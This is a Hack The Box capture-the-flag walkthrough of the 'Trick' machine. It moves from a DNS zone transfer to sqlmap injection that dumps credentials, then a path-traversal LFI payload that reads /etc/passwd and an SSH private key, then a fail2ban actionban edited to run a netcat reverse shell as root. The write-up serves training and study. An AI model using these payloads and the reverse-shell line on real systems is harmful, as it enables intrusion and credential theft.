# HTB Trick
![Alt text](./Trick/trick.png?raw=true "Card")

## 1. NMAP SCAN

As a first step I did a nmap scan on the address with the following result:

```
┌──(root💀animale)-[/home/animale/HTB/Trick]
└─# nmap -sC -sV 10.10.11.166
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 12:43 EDT
Nmap scan report for trick.htb (10.10.11.166)
Host is up (0.26s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.50 seconds
                                                            
```
## 2. Add machine ip to /etc/hosts

Add 10.10.11.166 in /etc/hosts with the following command:

```
echo "10.10.11.166 trick.htb">>/etc/hosts
```

## 3. Check the what's on port 80

Going on the web page we see as follow:

![Alt text](./Trick/trick.htb.png?raw=true "Web Page")

Running a gobuster scan, we don't see nothing interesting.

After some time searching for info, I decided to search for DNS Zone Transfer, which can be verified sendig **axfr** query.

AXFR is a mechanism for replicating DNS data across DNS servers. If, for example, the yale.edu administrator has two DNS servers, a.ns.yale.edu and b.ns.yale.edu, he can edit the yale.edu data on a.ns.yale.edu, and rely on AXFR to pull the same data to b.ns.yale.edu.

```
└─$ dig axfr trick.htb @trick.htb

; <<>> DiG 9.18.0-2-Debian <<>> axfr trick.htb @trick.htb
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 200 msec
;; SERVER: 10.10.11.166#53(trick.htb) (TCP)
;; WHEN: Wed Aug 31 13:00:17 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)

```

We notice that there is a subdomain called **preprod-payroll.trick.htb**. Let's check it out!!!

![Alt text](./Trick/preprod-payroll.trick.htb.png?raw=true "Web Page")

We can see that we are in a login page.
## **4. Scan preprod-payroll.trick.htb**

I run a scan with BurpSuite and it found a SQL Injection!

![Alt text](./Trick/Burp.png?raw=true "Web Page")
## **5. Check for SQL Injection**

Let's try to use a random usernale and password (admin/admin) to check the errors, if any.

The error is generic, **Username or password is incorrect.** .

Let's copy the request as a CURL request and use it in sqlmap, replacing curl with sqlmap.

```
└─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' --batch  
```

Here we are!!! We found a sql injection.

Let's re-run the command with the **--dbs** option to check the DBs. 

```
└─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' --dbs
```

We get 2 DBs:
1. information_schema
2. payroll_db

Let's see what is inside the **payroll_db**, use the options **-D payroll_db --tables** instead of **--dbs** 

```
└─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' -D payroll_db --tables

```

The result is:

```
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+

```

Let's see what's inside the **users** table, replacing **--tables** with **-T users --dump**

```
└─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' -D payroll_db -T users --dump

```
We got a username and password:

![Alt text](./Trick/trick_sqlmap_user.png?raw=true "Web Page")

Let's Use it to Login!!

![Alt text](./Trick/preprod-payroll.trick.htb.login.png?raw=true "Web Page")

After some time trying to enumerate the system, with no progress, I tried to enumerate the subdomains.

## **6. Subdomains enumaration**

No success until I decide to append the **preprod-** to my enumeration adding **-hh 5480** to exclude the response with different characters than 5480:

```
└─# wfuzz -c -t 400 --hh 5480  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -H "Host: preprod-FUZZ.trick.htb" http://trick.htb 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://trick.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000254:   200        178 L    631 W      9660 Ch     "marketing"                                                                                                                                                                

Total time: 23.60920
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 211.3158

```

Let's check what is inside, but we have to add it to our **/etc/hosts**

![Alt text](./Trick/preprod-marketing.trick.htb.png?raw=true "Web Page")

Navigating trough the web page, I noted that clicking on **Services** as well as in the other menu items, the url uses the **page** parameter that load other pages.

**http://preprod-marketing.trick.htb/index.php?page=services.html**


## **7. Local File Inclusion**

Let's try to check if the system is vulnerable:

**http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././..././..././..././etc/passwd**

**The system is vulnerable!!!**

We can see that there is a local user **michael** with the home direcory **/home/michael**

Let's try to see if there is a private key in the **.ssh** folder

**http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././..././..././..././/home/michael/.ssh/id_rsa**

## **8. Connect using ssh**

We have it!!! We can now use it to connect via ssh.

1. Copy the private key and paste into a new file called **trickssh**
2. Change the file permissions to 600
3. Connect using **ssh -i trickssh michael@trick.htb**

```
└─# ssh -i trickssh michael@trick.htb
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$ 
```
## **9. Privilege Escalation**

Once connected, let's see if michael is part of the sudoers:

```
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
michael@trick:~$ 

```

We can see the we can run without adding the password **/etc/init.d/fail2ban restart**

## **10. Fail2Ban exploit missconfiguration**

After some searches I found those 2 articles:
- https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49
- https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7

Following what stated there i did the following steps:
1. copy the **/etc/fail2ban/action.d/iptables-multiport.conf** in michael home
2. modify the coupied file as follow:
```
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = /usr/bin/nc 10.10.14.20 9999 -e /usr/bin/bash

```
3. moved back the file to its original location
```
michael@trick:~$ mv iptables-multiport.conf /etc/fail2ban/action.d/.
mv: replace '/etc/fail2ban/action.d/./iptables-multiport.conf', overriding mode 0644 (rw-r--r--)? y

```
4. run **sudo /etc/init.d/fail2ban restart**
5. On a new terminal, run **nc -lvp 9999**

When you will get ban from running ssh actionban will execute and you will get reverse shell as root.

To force it, just try to connect ssh with a user lambda.

HERE WE ARE!!!!

![Alt text](./Trick/root.png?raw=true "Web Page")


HOPE YOU ENJOYED!!!


